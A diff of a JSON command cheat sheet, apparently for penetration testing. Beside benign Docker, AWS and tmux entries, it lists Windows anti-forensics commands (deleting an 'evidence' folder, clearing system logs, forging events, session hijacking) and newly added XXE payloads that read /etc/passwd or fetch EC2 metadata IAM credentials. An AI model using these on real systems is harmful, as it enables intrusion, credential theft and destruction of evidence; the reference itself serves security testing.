+      ]
     },
     {
       "Name": "Create Directories",
       "Category": 17,
       "Description": "Create directories",
       "Command": "mkdir c:\\hidden",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 344,
+      "related": [
+        230,
+        231,
+        232,
+        233,
+        234
+      ]
     },
     {
       "Name": "Remove Directories",
       "Category": 17,
       "Description": "Remove directories",
       "Command": "rmdir /s /q c:\\evidence",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 345,
+      "related": [
+        230,
+        231,
+        232,
+        233,
+        234
+      ]
     },
     {
       "Name": "Rename Files",
       "Category": 17,
       "Description": "Rename files",
       "Command": "ren evil.exe legit.exe",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 346,
+      "related": [
+        230,
+        231,
+        232,
+        233,
+        234
+      ]
     },
     {
       "Name": "Copy with Attributes",
       "Category": 17,
       "Description": "Copy with attributes",
       "Command": "xcopy evil.exe c:\\windows /h /c",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 347,
+      "related": [
+        230,
+        231,
+        232,
+        233,
+        234
+      ]
     },
     {
       "Name": "Mirror Directories",
       "Category": 17,
       "Description": "Mirror directories",
       "Command": "robocopy c:\\source c:\\dest evil.exe /mir",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 348,
+      "related": [
+        230,
+        231,
+        232,
+        233,
+        234
+      ]
     },
     {
       "Name": "Replace Files",
       "Category": 17,
       "Description": "Replace files",
       "Command": "replace evil.exe c:\\windows /u",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 349,
+      "related": [
+        230,
+        231,
+        232,
+        233,
+        234
+      ]
     },
     {
       "Name": "Compress to CAB",
       "Category": 17,
       "Description": "Compress to CAB",
       "Command": "makecab evil.exe evil.cab",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 350,
+      "related": [
+        345,
+        346,
+        347,
+        348,
+        349
+      ]
     },
     {
       "Name": "Extract Files",
       "Category": 17,
       "Description": "Extract files",
       "Command": "extrac32 evil.cab",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 351,
+      "related": [
+        346,
+        347,
+        348,
+        349,
+        350
+      ]
     },
     {
       "Name": "Encode Payloads",
       "Category": 17,
       "Description": "Encode payloads",
       "Command": "powershell -enc <base64>",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 352,
+      "related": [
+        347,
+        348,
+        349,
+        350,
+        351
+      ]
     },
     {
       "Name": "Clear System Logs",
       "Category": 17,
       "Description": "Clear logs",
       "Command": "wevtutil cl System",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 353,
+      "related": [
+        348,
+        349,
+        350,
+        351,
+        352
+      ]
     },
     {
       "Name": "Create Fake Logs",
       "Category": 17,
       "Description": "Create fake logs",
       "Command": "eventcreate /t ERROR /id 100 /l APPLICATION /d \"Fake\"",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 354,
+      "related": [
+        349,
+        350,
+        351,
+        352,
+        353
+      ]
     },
     {
       "Name": "Disable Hibernate Logs",
       "Category": 17,
       "Description": "Disable hibernate logs",
       "Command": "powercfg /hibernate off",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 355,
+      "related": [
+        350,
+        351,
+        352,
+        353,
+        354
+      ]
     },
     {
       "Name": "Map Drives for Obfuscation",
       "Category": 17,
       "Description": "Map drives for obfuscation",
       "Command": "subst z: c:\\evil",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 356,
+      "related": [
+        351,
+        352,
+        353,
+        354,
+        355
+      ]
     },
     {
       "Name": "Kill Processes",
       "Category": 17,
       "Description": "Kill processes",
       "Command": "taskkill /im process.exe /f",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 357,
+      "related": [
+        352,
+        353,
+        354,
+        355,
+        356
+      ]
     },
     {
       "Name": "Reboot System",
       "Category": 17,
       "Description": "Reboot system",
       "Command": "shutdown /r /t 0",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 358,
+      "related": [
+        353,
+        354,
+        355,
+        356,
+        357
+      ]
     },
     {
       "Name": "Manage Disks",
       "Category": 17,
       "Description": "Manage disks",
       "Command": "diskpart",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 359,
+      "related": [
+        354,
+        355,
+        356,
+        357,
+        358
+      ]
     },
     {
       "Name": "Check Disk",
       "Category": 17,
       "Description": "Check disk",
       "Command": "chkdsk c: /f",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 360,
+      "related": [
+        355,
+        356,
+        357,
+        358,
+        359
+      ]
     },
     {
       "Name": "Scan System Files",
       "Category": 17,
       "Description": "Scan system files",
       "Command": "sfc /scannow",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 361,
+      "related": [
+        356,
+        357,
+        358,
+        359,
+        360
+      ]
     },
     {
       "Name": "Enable SAM Encryption",
       "Category": 17,
       "Description": "Enable SAM encryption",
       "Command": "syskey",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 362,
+      "related": [
+        357,
+        358,
+        359,
+        360,
+        361
+      ]
     },
     {
       "Name": "Create Shadow Copies",
       "Category": 17,
       "Description": "Create shadow copies",
       "Command": "vssadmin create shadow /for=c:",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 363,
+      "related": [
+        358,
+        359,
+        360,
+        361,
+        362
+      ]
     },
     {
       "Name": "Compare Files",
       "Category": 17,
       "Description": "Compare files",
       "Command": "comp file1 file2",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 364,
+      "related": [
+        359,
+        360,
+        361,
+        362,
+        363
+      ]
     },
     {
       "Name": "Compare File Differences",
       "Category": 17,
       "Description": "Compare file differences",
       "Command": "fc file1 file2",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 365,
+      "related": [
+        360,
+        361,
+        362,
+        363,
+        364
+      ]
     },
     {
       "Name": "Sort Data",
       "Category": 17,
       "Description": "Sort data",
       "Command": "sort < input.txt > output.txt",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 366,
+      "related": [
+        361,
+        362,
+        363,
+        364,
+        365
+      ]
     },
     {
       "Name": "Encrypt Files",
       "Category": 17,
       "Description": "Encrypt files",
       "Command": "cipher /e file.txt",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 367,
+      "related": [
+        362,
+        363,
+        364,
+        365,
+        366
+      ]
     },
     {
       "Name": "List Sessions",
       "Category": 17,
       "Description": "List sessions",
       "Command": "qwinsta",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 368,
+      "related": [
+        363,
+        364,
+        365,
+        366,
+        367
+      ]
     },
     {
       "Name": "Reset Session",
       "Category": 17,
       "Description": "Reset session",
       "Command": "rwinsta 1",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 369,
+      "related": [
+        364,
+        365,
+        366,
+        367,
+        368
+      ]
     },
     {
       "Name": "Hijack Session",
       "Category": 17,
       "Description": "Hijack session",
       "Command": "tscon 1 /dest:console",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 370,
+      "related": [
+        365,
+        366,
+        367,
+        368,
+        369
+      ]
     },
     {
       "Name": "Kill Tasks",
       "Category": 17,
       "Description": "Kill tasks",
       "Command": "tskill processname",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 371,
+      "related": [
+        366,
+        367,
+        368,
+        369,
+        370
+      ]
     },
     {
       "Name": "End Session",
       "Category": 17,
       "Description": "End session",
       "Command": "logoff 1",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 372,
+      "related": [
+        367,
+        368,
+        369,
+        370,
+        371
+      ]
     },
     {
       "Name": "Set Audit Policy",
       "Category": 17,
       "Description": "Set audit policy",
       "Command": "auditpol /set /category:\"Logon\" /success:enable",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 373,
+      "related": [
+        368,
+        369,
+        370,
+        371,
+        372
+      ]
     },
     {
       "Name": "Export Security Config",
       "Category": 17,
       "Description": "Export security config",
       "Command": "secedit /export /cfg config.txt",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 374,
+      "related": [
+        369,
+        370,
+        371,
+        372,
+        373
+      ]
     },
     {
       "Name": "Record Screen",
       "Category": 17,
       "Description": "Record screen",
       "Command": "psr /start /output record.zip /sc 1",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 375,
+      "related": [
+        370,
+        371,
+        372,
+        373,
+        374
+      ]
     },
     {
       "Name": "Open Explorer",
       "Category": 17,
       "Description": "Open explorer",
       "Command": "explorer c:\\evil",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 376,
+      "related": [
+        371,
+        372,
+        373,
+        374,
+        375
+      ]
     },
     {
       "Name": "Launch Control Panel",
       "Category": 17,
       "Description": "Launch control panel",
       "Command": "control",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 377,
+      "related": [
+        372,
+        373,
+        374,
+        375,
+        376
+      ]
     },
     {
       "Name": "Send Messages",
       "Category": 17,
       "Description": "Send messages",
       "Command": "msg * \"Warning\"",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 378,
+      "related": [
+        373,
+        374,
+        375,
+        376,
+        377
+      ]
     },
     {
       "Name": "Modify PATH",
       "Category": 17,
       "Description": "Modify PATH",
       "Command": "set PATH=%PATH%;C:\\evil",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 379,
+      "related": [
+        374,
+        375,
+        376,
+        377,
+        378
+      ]
     },
     {
       "Name": "Run Nginx Server Docker",
       "Category": 22,
       "Description": "Run an Nginx server.",
       "Command": "docker run -d -p 80:80 nginx",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 380,
+      "related": [
+        375,
+        376,
+        377,
+        378,
+        379
+      ]
     },
     {
       "Name": "Download WordPress Image Docker",
       "Category": 22,
       "Description": "Download WordPress image.",
       "Command": "docker pull wordpress:latest",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 381,
+      "related": [
+        376,
+        377,
+        378,
+        379,
+        380
+      ]
     },
     {
       "Name": "Launch WordPress Docker",
       "Category": 22,
       "Description": "Launch WordPress.",
       "Command": "docker run -d --name wp -p 8080:80 wordpress",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 382,
+      "related": [
+        377,
+        378,
+        379,
+        380,
+        381
+      ]
     },
     {
       "Name": "Build Custom WordPress Image Docker",
       "Category": 22,
       "Description": "Build a custom WordPress image.",
       "Command": "docker build -t my-wp-site:latest .",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 383,
+      "related": [
+        378,
+        379,
+        380,
+        381,
+        382
+      ]
     },
     {
       "Name": "Upload to Registry Docker",
       "Category": 22,
       "Description": "Upload to a registry.",
       "Command": "docker push myrepo/my-wp-site:latest",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 384,
+      "related": [
+        379,
+        380,
+        381,
+        382,
+        383
+      ]
     },
     {
       "Name": "Start Ubuntu Shell Docker",
       "Category": 22,
       "Description": "Start an Ubuntu shell.",
       "Command": "docker run -it ubuntu bash",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 385,
+      "related": [
+        380,
+        381,
+        382,
+        383,
+        384
+      ]
     },
     {
       "Name": "Access WordPress Container Docker",
       "Category": 22,
       "Description": "Access WordPress container.",
       "Command": "docker exec -it wp bash",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 386,
+      "related": [
+        381,
+        382,
+        383,
+        384,
+        385
+      ]
     },
     {
       "Name": "Monitor WordPress Logs Docker",
       "Category": 22,
       "Description": "Monitor WordPress logs.",
       "Command": "docker logs -f wp",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 387,
+      "related": [
+        382,
+        383,
+        384,
+        385,
+        386
+      ]
     },
     {
       "Name": "Run MySQL Server Docker",
       "Category": 22,
       "Description": "Run MySQL server.",
       "Command": "docker run -d -p 3306:3306 mysql",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 388,
+      "related": [
+        383,
+        384,
+        385,
+        386,
+        387
+      ]
     },
     {
       "Name": "Persist WordPress Data Docker",
       "Category": 22,
       "Description": "Persist WordPress data.",
       "Command": "docker run -v wp-data:/var/www/html wordpress",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 389,
+      "related": [
+        384,
+        385,
+        386,
+        387,
+        388
+      ]
     },
     {
       "Name": "Create WordPress Network Docker",
       "Category": 22,
       "Description": "Create a WordPress network.",
       "Command": "docker network create wp-net",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 390,
+      "related": [
+        385,
+        386,
+        387,
+        388,
+        389
+      ]
     },
     {
       "Name": "Run in Custom Network Docker",
       "Category": 22,
       "Description": "Run in custom network.",
       "Command": "docker run --network wp-net wordpress",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 391,
+      "related": [
+        386,
+        387,
+        388,
+        389,
+        390
+      ]
     },
     {
       "Name": "Stop All Containers Docker",
       "Category": 22,
       "Description": "Stop all containers.",
       "Command": "docker stop $(docker ps -q)",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 392,
+      "related": [
+        387,
+        388,
+        389,
+        390,
+        391
+      ]
     },
     {
       "Name": "Remove All Containers Docker",
       "Category": 22,
       "Description": "Remove all containers.",
       "Command": "docker rm $(docker ps -a -q)",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 393,
+      "related": [
+        388,
+        389,
+        390,
+        391,
+        392
+      ]
     },
     {
       "Name": "Remove All Images Docker",
       "Category": 22,
       "Description": "Remove all images.",
       "Command": "docker rmi $(docker images -q)",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 394,
+      "related": [
+        389,
+        390,
+        391,
+        392,
+        393
+      ]
     },
     {
       "Name": "Auto-Restart WordPress Docker",
       "Category": 22,
       "Description": "Auto-restart WordPress.",
       "Command": "docker run -d --restart always wp",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 395,
+      "related": [
+        390,
+        391,
+        392,
+        393,
+        394
+      ]
     },
     {
       "Name": "Get Container IP Docker",
       "Category": 22,
       "Description": "Get container IP.",
       "Command": "docker inspect --format '{{.NetworkSettings.IPAddress}}' wp",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 396,
+      "related": [
+        391,
+        392,
+        393,
+        394,
+        395
+      ]
     },
     {
       "Name": "Set Database Host Docker",
       "Category": 22,
       "Description": "Set database host.",
       "Command": "docker run -e WORDPRESS_DB_HOST=mysql wordpress",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 397,
+      "related": [
+        392,
+        393,
+        394,
+        395,
+        396
+      ]
     },
     {
       "Name": "Limit Container Memory Docker",
       "Category": 22,
       "Description": "Limit container memory.",
       "Command": "docker run --memory 256m wordpress",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 398,
+      "related": [
+        393,
+        394,
+        395,
+        396,
+        397
+      ]
     },
     {
       "Name": "Limit Container CPU Docker",
       "Category": 22,
       "Description": "Limit container CPU.",
       "Command": "docker run --cpus 1 wordpress",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 399,
+      "related": [
+        394,
+        395,
+        396,
+        397,
+        398
+      ]
     },
     {
       "Name": "Create S3 Bucket and Upload File AWS",
       "Category": 23,
       "Description": "Creates a new S3 bucket and uploads a file, useful for testing bucket permissions and data exposure.",
       "Command": "aws s3 mb s3://mybucket aws s3 cp localfile.txt s3://mybucket/",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 400,
+      "related": [
+        401,
+        402,
+        403,
+        404,
+        405
+      ]
     },
     {
       "Name": "List All S3 Buckets AWS",
       "Category": 23,
       "Description": "Lists all S3 buckets in the account, helping identify misconfigured or publicly accessible buckets.",
       "Command": "aws s3 ls",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 401,
+      "related": [
+        400,
+        402,
+        403,
+        404,
+        405
+      ]
     },
     {
       "Name": "Download File from S3 AWS",
       "Category": 23,
       "Description": "Downloads a file from an S3 bucket, useful for verifying access controls.",
       "Command": "aws s3 cp s3://mybucket/file.txt localfile.txt",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 402,
+      "related": [
+        400,
+        401,
+        403,
+        404,
+        405
+      ]
     },
     {
       "Name": "Sync Local Directory with S3 Bucket AWS",
       "Category": 23,
       "Description": "Synchronizes a local directory with an S3 bucket, ideal for backing up data or testing sync permissions.",
       "Command": "aws s3 sync localdir s3://mybucket/",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 403,
+      "related": [
+        400,
+        401,
+        402,
+        404,
+        405
+      ]
     },
     {
       "Name": "Launch EC2 Instance AWS",
       "Category": 23,
       "Description": "Launches a new EC2 instance, useful for setting up test environments or simulating attacker infrastructure.",
       "Command": "aws ec2 run-instances --image-id ami-123 --count 1 --instance-type t2.micro --key-name MyKey --security-group-ids sg-123 --subnet-id subnet-123",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 404,
+      "related": [
+        400,
+        401,
+        402,
+        403,
+        405
+      ]
     },
     {
       "Name": "Terminate EC2 Instance AWS",
       "Category": 23,
       "Description": "Terminates an EC2 instance, ensuring cleanup after testing to prevent unauthorized access.",
       "Command": "aws ec2 terminate-instances --instance-ids i-123",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 405,
+      "related": [
+        400,
+        401,
+        402,
+        403,
+        404
+      ]
     },
     {
       "Name": "Describe All EC2 Instances AWS",
       "Category": 23,
       "Description": "Lists all EC2 instances, helping identify running instances and their configurations.",
       "Command": "aws ec2 describe-instances",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 406,
+      "related": [
+        404,
+        405,
+        407,
+        408,
+        409
+      ]
     },
     {
       "Name": "Create Security Group and Add Rule AWS",
       "Category": 23,
       "Description": "Creates a security group and adds an SSH ingress rule, useful for testing network access controls.",
       "Command": "aws ec2 create-security-group --group-name MySG --description \"My SG\" aws ec2 authorize-security-group-ingress --group-id sg-123 --protocol tcp --port 22 --cidr 0.0.0.0/0",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 407,
+      "related": [
+        404,
+        405,
+        406,
+        408,
+        409
+      ]
     },
     {
       "Name": "Create IAM User and Attach Policy AWS",
       "Category": 23,
       "Description": "Creates an IAM user and grants S3 read-only access, ideal for testing least privilege principles.",
       "Command": "aws iam create-user --user-name Bob aws iam attach-user-policy --user-name Bob --policy-arn arn:aws:iam::aws:policy/AmazonS3ReadOnlyAccess",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 408,
+      "related": [
+        404,
+        405,
+        406,
+        407,
+        409
+      ]
     },
     {
       "Name": "List All IAM Users AWS",
       "Category": 23,
       "Description": "Lists all IAM users, helping identify unauthorized or dormant accounts.",
       "Command": "aws iam list-users",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 409,
+      "related": [
+        404,
+        405,
+        406,
+        407,
+        408
+      ]
     },
     {
       "Name": "Create Lambda Function AWS",
       "Category": 23,
       "Description": "Creates a Lambda function, useful for testing serverless application security.",
       "Command": "aws lambda create-function --function-name MyFunction --runtime python3.8 --role arn:aws:iam::123456789012:role/lambda-role --handler lambda_function.lambda_handler --zip-file fileb://function.zip",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 410,
+      "related": [
+        409,
+        411,
+        412,
+        413,
+        414
+      ]
     },
     {
       "Name": "Invoke Lambda Function AWS",
       "Category": 23,
       "Description": "Invokes a Lambda function, allowing testers to verify function behavior and outputs.",
       "Command": "aws lambda invoke --function-name MyFunction output.txt",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 411,
+      "related": [
+        409,
+        410,
+        412,
+        413,
+        414
+      ]
     },
     {
       "Name": "Create DynamoDB Table AWS",
       "Category": 23,
       "Description": "Creates a DynamoDB table, useful for testing data storage security.",
       "Command": "aws dynamodb create-table --table-name MyTable --attribute-definitions AttributeName=Id,AttributeType=S --key-schema AttributeName=Id,KeyType=HASH --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 412,
+      "related": [
+        409,
+        410,
+        411,
+        413,
+        414
+      ]
     },
     {
       "Name": "Insert Item into DynamoDB AWS",
       "Category": 23,
       "Description": "Inserts an item into a DynamoDB table, allowing testers to verify data access controls.",
       "Command": "aws dynamodb put-item --table-name MyTable --item '{\"Id\": {\"S\": \"1\"}, \"Name\": {\"S\": \"John\"}}'",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 413,
+      "related": [
+        409,
+        410,
+        411,
+        412,
+        414
+      ]
     },
     {
       "Name": "Get Item from DynamoDB AWS",
       "Category": 23,
       "Description": "Retrieves an item from a DynamoDB table, useful for testing read permissions.",
       "Command": "aws dynamodb get-item --table-name MyTable --key '{\"Id\": {\"S\": \"1\"}}'",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 414,
+      "related": [
+        409,
+        410,
+        411,
+        412,
+        413
+      ]
     },
     {
       "Name": "Create CloudFormation Stack AWS",
       "Category": 23,
       "Description": "Creates a CloudFormation stack, ideal for deploying test infrastructure reproducibly.",
       "Command": "aws cloudformation create-stack --stack-name MyStack --template-body file://template.yaml",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 415,
+      "related": [
+        414,
+        416,
+        417,
+        418,
+        419
+      ]
     },
     {
       "Name": "Describe CloudFormation Stack AWS",
       "Category": 23,
       "Description": "Describes a CloudFormation stack, helping verify deployed resources.",
       "Command": "aws cloudformation describe-stacks --stack-name MyStack",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 416,
+      "related": [
+        414,
+        415,
+        417,
+        418,
+        419
+      ]
     },
     {
       "Name": "Create RDS Database Instance AWS",
       "Category": 23,
       "Description": "Creates an RDS database instance, useful for testing database security configurations.",
       "Command": "aws rds create-db-instance --db-instance-identifier MyDB --db-instance-class db.t2.micro --engine mysql --master-username admin --master-user-password password --allocated-storage 20",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 417,
+      "related": [
+        414,
+        415,
+        416,
+        418,
+        419
+      ]
     },
     {
       "Name": "List All RDS Database Instances AWS",
       "Category": 23,
       "Description": "Lists all RDS instances, helping identify database configurations and potential vulnerabilities.",
       "Command": "aws rds describe-db-instances",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 418,
+      "related": [
+        414,
+        415,
+        416,
+        417,
+        419
+      ]
     },
     {
       "Name": "Set Up CloudWatch Alarm for EC2 Instance AWS",
       "Category": 23,
       "Description": "Sets up a CloudWatch alarm for CPU utilization on an EC2 instance.",
       "Command": "aws cloudwatch put-metric-alarm --alarm-name CPUAlarm --metric-name CPUUtilization --namespace AWS/EC2 --statistic Average --period 300 --threshold 80 --comparison-operator GreaterThanThreshold --dimensions Name=InstanceId,Value=i-123 --evaluation-periods 2 --alarm-actions arn:aws:sns:us-east-1:123456789012:MyTopic",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 419,
+      "related": [
+        414,
+        415,
+        416,
+        417,
+        418
+      ]
     },
     {
       "Name": "Start Tmux Session",
       "Category": 24,
       "Description": "Start a session.",
       "Command": "tmux new-session -s dev",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 420,
+      "related": [
+        421,
+        422,
+        423,
+        424,
+        425
+      ]
     },
     {
       "Name": "Create Named Window in Tmux",
       "Category": 24,
-      "Description": "create a window for vim, name it “code” with Ctrl-b ,.",
+      "Description": "create a window for vim, name it \"code\" with Ctrl-b ,.",
       "Command": "Press Ctrl-b c",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 421,
+      "related": [
+        420,
+        422,
+        423,
+        424,
+        425
+      ]
     },
     {
       "Name": "Split Window in Tmux",
       "Category": 24,
       "Description": "split the window, running python manage.py runserver in the new pane.",
       "Command": "Press Ctrl-b %",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 422,
+      "related": [
+        420,
+        421,
+        423,
+        424,
+        425
+      ]
     },
     {
       "Name": "Detach and Reconnect Tmux",
       "Category": 24,
       "Description": "detach and reconnect later with tmux attach-session -t dev.",
       "Command": "Press Ctrl-b d",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 423,
+      "related": [
+        420,
+        421,
+        422,
+        424,
+        425
+      ]
     },
     {
       "Name": "Start Monitoring Session in Tmux",
       "Category": 24,
       "Description": "Start a session with tmux new-session -s monitor.",
       "Command": "tmux new-session -s monitor",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 424,
+      "related": [
+        420,
+        421,
+        422,
+        423,
+        425
+      ]
     },
     {
       "Name": "Split Horizontally in Tmux",
       "Category": 24,
       "Description": "split horizontally, running htop in the top pane and tail -f /var/log/syslog in the bottom.",
-      "Command": "Press Ctrl-b ”",
-      "OS": "Linux"
+      "Command": "Press Ctrl-b \"\"",
+      "OS": "Linux",
+      "id": 425,
+      "related": [
+        420,
+        421,
+        422,
+        423,
+        424
+      ]
     },
     {
       "Name": "See Pane Numbers in Tmux",
       "Category": 24,
       "Description": "see pane numbers and 1 to switch to the log pane.",
       "Command": "Press Ctrl-b q",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 426,
+      "related": [
+        425,
+        427,
+        428,
+        429,
+        430
+      ]
     },
     {
       "Name": "Copy Error in Tmux",
       "Category": 24,
       "Description": "Copy an error with Ctrl-b [, select with Space and Enter, then paste into a file with Ctrl-b ].",
       "Command": "Press Ctrl-b [",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 427,
+      "related": [
+        425,
+        426,
+        428,
+        429,
+        430
+      ]
     },
     {
       "Name": "Create Team Session in Tmux",
       "Category": 24,
       "Description": "Create a session with tmux new-session -s team.",
       "Command": "tmux new-session -s team",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 428,
+      "related": [
+        425,
+        426,
+        427,
+        429,
+        430
+      ]
     },
     {
       "Name": "Share Tmux Session",
       "Category": 24,
       "Description": "Share the session name and server details with a colleague, who attaches using tmux attach-session -t team.",
       "Command": "tmux attach-session -t team",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 429,
+      "related": [
+        425,
+        426,
+        427,
+        428,
+        430
+      ]
     },
     {
       "Name": "Open Shared Editor Window in Tmux",
       "Category": 24,
       "Description": "open a window for a shared editor, and Ctrl-b f to find it later by name.",
       "Command": "Press Ctrl-b c",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 430,
+      "related": [
+        425,
+        426,
+        427,
+        428,
+        429
+      ]
+    },
+    {
+      "Name": "Shodan",
+      "Category": 0,
+      "Description": "Search for company name and variations to look for nonstandard ports and outdated services",
+      "Command": "https://www.shodan.io/",
+      "OS": "Win/Lin",
+      "id": 430,
+      "related": [
+        0,
+        3,
+        193,
+        194,
+        195
+      ]
+    },
+    {
+      "Name": "sub3num",
+      "Category": 0,
+      "Description": "Tool for subdomain enumeration https://github.com/saharshtapi/sub3num",
+      "Command": "./sub3num <target_domain>",
+      "OS": "Linux",
+      "id": 431,
+      "related": [
+        6,
+        245,
+        246,
+        432,
+        433
+      ]
+    },
+    {
+      "Name": "subfinder",
+      "Category": 0,
+      "Description": "Tool for discovering subdomains https://github.com/projectdiscovery/subfinder",
+      "Command": "subfinder -d <target_domain>",
+      "OS": "Linux",
+      "id": 432,
+      "related": [
+        6,
+        245,
+        246,
+        431,
+        434
+      ]
+    },
+    {
+      "Name": "reconng",
+      "Category": 0,
+      "Description": "Tool for reconnaissance https://github.com/lanmaster53/recon-ng",
+      "Command": "reconng",
+      "OS": "Linux",
+      "id": 433,
+      "related": [
+        0,
+        3,
+        430,
+        431,
+        432
+      ]
+    },
+    {
+      "Name": "GrayHat Warfare",
+      "Category": 0,
+      "Description": "Look for cloud buckets by company names and variations with bucket keywords",
+      "Command": "https://grayhatwarfare.com/",
+      "OS": "Win/Lin",
+      "id": 434,
+      "related": [
+        0,
+        400,
+        401,
+        402,
+        403
+      ]
+    },
+    {
+      "Name": "XXE",
+      "Category": 2,
+      "Description": "Test for XML External Entity vulnerabilities",
+      "Command": "<!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/passwd\"> ]> <vulnfield>$ent</vulnfield>",
+      "OS": "Win/Lin",
+      "id": 435,
+      "related": [
+        247,
+        248,
+        436,
+        437,
+        438
+      ]
+    },
+    {
+      "Name": "XXE with SSRF",
+      "Category": 2,
+      "Description": "Retrieve data from internal EC2 instance using SSRF",
+      "Command": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin\"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>",
+      "OS": "Win/Lin",
+      "id": 436,
+      "related": [
+        247,
+        248,
+        435,
+        437,
+        438
+      ]
+    },
+    {
+      "Name": "XXE Without Full Control",
+      "Category": 2,
+      "Description": "Include XXE in vulnerable field without full document control",
+      "Command": "productId=1<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>&storeId=2",
+      "OS": "Win/Lin",
+      "id": 437,
+      "related": [
+        247,
+        248,
+        435,
+        436,
+        438
+      ]
+    },
+    {
+      "Name": "XXE Embedded in Image",
+      "Category": 2,
+      "Description": "Embed XXE in an SVG image",
+      "Command": "<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/hostname\" > ]><svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\"><text font-size=\"16\" x=\"0\" y=\"16\">&xxe;</text></svg>",
+      "OS": "Win/Lin",
+      "id": 438,
